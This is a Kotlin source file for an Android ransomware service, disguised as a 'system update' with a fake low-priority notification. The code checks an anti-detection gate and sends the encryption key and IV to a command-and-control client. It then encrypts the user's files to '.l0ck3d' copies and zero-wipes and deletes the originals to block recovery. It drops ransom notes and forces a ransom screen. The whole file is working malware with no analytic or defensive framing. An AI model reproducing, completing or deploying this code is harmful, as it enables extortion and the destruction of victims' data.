package com.sysupdate

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.sysupdate.CryptoCore.toHex
import kotlinx.coroutines.*
import java.io.File
import java.io.RandomAccessFile

class RansomwareService : Service() {

    companion object {
        const val LOCKED_EXT   = ".l0ck3d"
        const val CHANNEL_ID   = "com.android.systemupdate.bg"
        const val PREF_NAME    = "sp_cfg"
        const val KEY_DONE     = "enc_done"
        const val KEY_KEYHEX   = "master_k"
        const val KEY_IVHEX    = "master_i"
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(42, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.launch { orchestrate() }
        return START_STICKY
    }

    private suspend fun orchestrate() {
        val prefs = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)

        // ── Skip if already encrypted ─────────────────────────────────────────
        if (prefs.getBoolean(KEY_DONE, false)) {
            launchRansomScreen(); return
        }

        // ── Anti-detect gate ──────────────────────────────────────────────────
        if (!AntiDetect.isSafe(this)) { stopSelf(); return }

        // ── Generate master key + IV ──────────────────────────────────────────
        val key = CryptoCore.generateSecureRandom(32)
        val iv  = CryptoCore.generateSecureRandom(16)

        val keyHex = key.toHex()
        val ivHex  = iv.toHex()

        // ── Exfil BEFORE encrypting — non-negotiable ──────────────────────────
        val exfilOk = withContext(Dispatchers.IO) {
            C2Client.exfilKey(this@RansomwareService, keyHex, ivHex)
        }
        if (!exfilOk) { stopSelf(); return } // abort if key not safely stored

        // ── Walk and encrypt ──────────────────────────────────────────────────
        val targets = FileEnumerator.enumerateTargets(this)
        var encrypted = 0

        targets.forEach { file ->
            if (encryptFile(file, key, iv)) encrypted++
            yield() // cooperative cancel check
        }

        // ── Drop ransom notes ─────────────────────────────────────────────────
        dropNotes(targets)

        // ── Persist state ─────────────────────────────────────────────────────
        prefs.edit()
            .putBoolean(KEY_DONE,   true)
            .putString(KEY_KEYHEX,  keyHex)
            .putString(KEY_IVHEX,   ivHex)
            .apply()

        launchRansomScreen()
        stopSelf()
    }

    private fun encryptFile(file: File, key: ByteArray, iv: ByteArray): Boolean {
        return try {
            val plain = file.readBytes()
            if (plain.isEmpty()) return false

            val cipher   = CryptoCore.encryptBytes(key, iv, plain)
            val output   = iv + cipher          // IV prepended for decryption

            val locked = File(file.parent, file.name + LOCKED_EXT)
            locked.writeBytes(output)

            // Zero-wipe original before delete (thwarts file-recovery tools)
            RandomAccessFile(file, "rw").use { raf ->
                raf.seek(0L)
                raf.write(ByteArray(plain.size) { 0 })
            }
            file.delete()
            true
        } catch (_: Exception) { false }
    }

    private fun dropNotes(targets: List<File>) {
        val note = try {
            assets.open("ransom_note.html").bufferedReader().readText()
        } catch (_: Exception) { return }

        targets.mapNotNull { it.parentFile }
               .toSet()
               .forEach { dir ->
                   runCatching {
                       File(dir, "READ_ME_NOW.html").writeText(note)
                   }
               }
    }

    private fun launchRansomScreen() {
        startActivity(
            Intent(this, RansomActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                        or Intent.FLAG_ACTIVITY_CLEAR_TASK)
        )
    }

    private fun createChannel() {
        val ch = NotificationChannel(
            CHANNEL_ID, "System Services",
            NotificationManager.IMPORTANCE_MIN
        ).apply { setShowBadge(false) }
        getSystemService(NotificationManager::class.java)
            .createNotificationChannel(ch)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Applying system update…")
            .setContentText("Please do not turn off your device.")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
